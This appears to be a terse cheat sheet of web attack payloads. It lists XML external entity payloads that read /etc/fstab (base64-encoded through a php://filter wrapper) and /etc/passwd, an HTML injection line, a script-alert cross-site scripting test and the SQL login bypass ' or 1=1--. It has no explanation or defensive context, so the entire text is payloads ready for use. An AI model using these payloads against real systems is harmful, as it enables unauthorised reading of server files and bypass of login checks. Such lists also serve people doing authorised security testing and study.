XML Payload:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY email SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/fstab">
]>

<root>
<name>gowtham</name>
<tel>test</tel>
<email>&email;</email>
<password>test</password>
</root>

<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY email  "test@test.com">
]>
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY email SYSTEM "/etc/passwd">
]>

**HTML Injection:**

<h1>HTML</h1>

### <script>alert(“Hello World”)</script>

SQL Auth Bypass:

### **' or 1=1--**
